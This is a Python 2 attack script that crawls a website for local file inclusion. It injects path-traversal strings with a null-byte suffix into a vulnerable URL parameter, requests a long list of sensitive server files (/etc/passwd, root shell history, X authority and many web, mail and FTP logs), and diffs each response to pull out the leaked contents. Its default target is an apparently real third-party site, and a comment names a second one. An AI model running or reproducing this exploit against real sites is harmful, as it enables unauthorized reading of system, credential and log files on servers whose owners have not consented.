#!/usr/bin/python
import difflib
import time
import urllib2

from pprint import pprint

default_lfi_files = [
"/etc/passwd",
"/etc/group",
"/etc/sshd",

#linux
"/apache2/logs/access.log",
"/apache2/logs/error.log",
"/apache/logs/access.log",
"/apache/logs/error.log",
"/etc/httpd/logs/acces_log",
"/etc/httpd/logs/acces.log",
"/etc/httpd/logs/error_log",
"/etc/httpd/logs/error.log",
"/logs/access.log",
"/logs/error.log",
"/opt/lampp/logs/access_log",
"/opt/lampp/logs/access.log",
"/opt/lampp/logs/error_log",
"/opt/lampp/logs/error.log",
"/opt/xampp/logs/access_log",
"/opt/xampp/logs/access.log",
"/opt/xampp/logs/error_log",
"/opt/xampp/logs/error.log",
"/Program Files\\Apache Group\Apache\\logs\\access.log",
"/Program Files\\Apache Group\Apache\\logs\\error.log",
"/usr/local/apache2/logs/access_log",
"/usr/local/apache2/logs/access.log",
"/usr/local/apache2/logs/error_log",
"/usr/local/apache2/logs/error.log",
"/usr/local/apache/logs/access_log",
"/usr/local/apache/logs/access.log",
"/usr/local/apache/logs/error_log",
"/usr/local/apache/logs/error.log",
"/var/log/access_log",
"/var/log/access.log",
"/var/log/apache2/access_log",
"/var/log/apache2/access.log",
"/var/log/apache2/error_log",
"/var/log/apache2/error.log",
"/var/log/apache/access_log",
"/var/log/apache/access.log",
"/var/log/apache/error_log",
"/var/log/apache/error.log",
"/var/log/error_log",
"/var/log/error.log",
"/var/log/httpd/access_log",
"/var/log/httpd/access.log",
"/var/log/httpd/error.log",
"/var/www/logs/access_log",
"/var/www/logs/access.log",
"/var/www/logs/error_log",
"/var/www/logs/error.log",

#other

"/var/log/lastlog",
"/var/log/telnetd",
"/var/run/utmp",
"/var/log/secure",
"/root/.ksh_history",
"/root/.bash_history",
"/root/.bash_logut",
"/var/log/wtmp",
"/etc/wtmp",
"/var/run/utmp",
"/etc/utmp",
"/var/log",
"/var/adm",
"/var/apache/log",
"/var/apache/logs",
"/usr/local/apache/log",
"/usr/local/apache/logs",
"/var/log/acct",
"/var/log/xferlog",
"/var/log/messages",
"/var/log/proftpd/xferlog.legacy",
"/var/log/proftpd.access_log",
"/var/log/proftpd.xferlog",
"/var/log/httpd/access_log",
"/etc/httpd/logs/access_log",
"/etc/httpd/logs/error_log",
"/var/log/httpsd/ssl.access_log",
"/var/log/httpsd/ssl_log",
"/var/log/httpsd/ssl.access_log",
"/etc/mail/access",
"/var/log/qmail",
"/var/log/smtpd",
"/var/log/samba",
"/var/log/samba-log.%m",
"/var/lock/samba",
"/root/.Xauthority",
"/var/log/poplog",
"/var/log/news.all",
"/var/log/spooler",
"/var/log/news",
"/var/log/news/news",
"/var/log/news/news.all",
"/var/log/news/news.crit",
"/var/log/news/news.err",
"/var/log/news/news.notice",
"/var/log/news/suck.err",
"/var/log/news/suck.notice",
"/var/spool/tmp",
"/var/spool/errors",
"/var/spool/logs",
"/var/spool/locks",
"/usr/local/www/logs/thttpd_log",
"/var/log/thttpd_log",
"/var/log/ncftpd/misclog.txt",
"/var/log/ncftpd.errs",
"/var/log/auth",

#iriX
"/var/adm/SYSLOG",
"/var/adm/sulog",
"/var/adm/utmp",
"/var/adm/utmpx",
"/var/adm/wtmp",
"/var/adm/wtmpx",
"/var/adm/lastlog/username",
"/usr/spool/lp/log",
"/var/adm/lp/lpd-errs",
"/usr/lib/cron/log",
"/var/adm/loginlog",
"/var/adm/pacct",
"/var/adm/dtmp",
"/var/adm/acct/sum/loginlog",
"/var/adm/X0msgs",
"/var/adm/crash/vmcore",
"/var/adm/crash/unix",
#other
"/etc/hosts.allow",
];


#ttp://www.sofora.ru/landdesign_uslugi_melichimles_polezno.html?id=../../../../../../etc/passwd%00 
default_path = "../../../../../..";
default_site = "http://www.sofora.ru/landdesign_uslugi_melichimles_polezno.html";
default_vuln_param = "id";
default_post = "%00";

#without headers and user agent now
class lfi_crawler():
    """lfi_crawler try to find file locations at server
    by sending paths in vulnerable URL parameter
    WARNING: script not finds vulnerable parameters,
    you must do it with some other tools (acunetix for example)"""
    def __init__(self,
            site = default_site,
            vuln_param = default_vuln_param,
            path = default_path,
            lfi_files = default_lfi_files, 
            post = default_post):
        """ site url to vulnerable site
        vuln_param - name of exploitable parameter
        path - path to root
        lfi_files - list of strings, contains absolute paths to logs
        For example acunetix find lfi vulnerability at
        http://example.com/index.php?id=../../../etc/passwd
        path is ../../..
        vuln param is id=
        FIXME:WRITEME
        """

        self.urlstart = site + "?" + vuln_param + "=" + path
        self.lfi_dict = lfi_files
        self.urlstop = post;
        self.index = 0;
        self.get_clean_page();
        self.idle_time = 0;

    def get_clean_page(self):
        urlpath = self.urlstart + "ssfdsfsfsfsfss" + self.urlstop;
        req = urllib2.urlopen(urlpath);
        self.clean_page = req.read()
    def __iter__(self):
        return self
    def next(self):
        """check next file location"""
        if self.index >= len(self.lfi_dict):
            raise StopIteration;
        if self.index > 0:
            self.idle();

        urlpath = self.urlstart + self.lfi_dict[self.index] + self.urlstop;
            
        try:
            req = urllib2.urlopen(urlpath);
        except urllib2.HTTPError:
            print "URL_ERROR: %s" % urlpath;
            self.index += 1;
            return

        cur_page = req.read();
        
        diff = self.find_lfi(cur_page)
        if diff != None:
            print "FINDED FILE %s:\n %s" %(self.lfi_dict[self.index], diff);

        self.index += 1;
    def find_lfi(self, page):
        """simple check len of cur page and if it more than clean page print to stdout
        FIXME! just stupid check
        magic value 42 ^___^"""
        if len(page) <= len(self.clean_page) + 42:
            return None
        cplines = self.clean_page.split('\n')
        plines = page.split('\n')
        for start in range(len(cplines)):
            if cplines[start] != plines[start]:
                break
        for j in range(1, len(cplines)):
            if cplines[-j] != plines[-j]:
                break
        stop = len(plines) - j
        return  "\n".join(plines[start:stop])
       
    def set_idle(self, seconds):
        """set idle time between http requests (default 0)"""
        if seconds > 0.:
            self.idle_time = seconds
    def idle(self):
        if self.idle_time == 0:
            return;
        else:
            time.sleep(self.idle_time);
#rewrite me
def main():
    from optparse import OptionParser
    parser = OptionParser()
    parser.add_option("-u", "--url", action="store",
                      type="string", dest="url",
                      help="url path")
    parser.add_option("-r", "--rootpath", action="store", 
                      type="string", dest="rootpath", default="../../",
                      help="relative path to root of fs from script on server")
    parser.add_option("-p", "--param", action="store", default="id",
                      type="string", dest="param",
                      help="vulnerable parameter")
    parser.add_option("-e", "--ending", action="store",
                      type="string", dest="ending", default="",
                      help="optional url ending\n"
                      "may be need for poison null (%00)")

    (options, args) = parser.parse_args()
    print options, args
    if options.url is None:
        parser.print_help()
        return
    crawler = lfi_crawler(options.url, options.param, options.rootpath,
                          post=options.ending);
    #crawler = lfi_crawler("http://povstanets.kiev.ua/index.php", "do=", "../../../../../..");
    #crawler.set_idle(0.5);

    for i in crawler:
        pass;

if __name__ == "__main__":
    main()

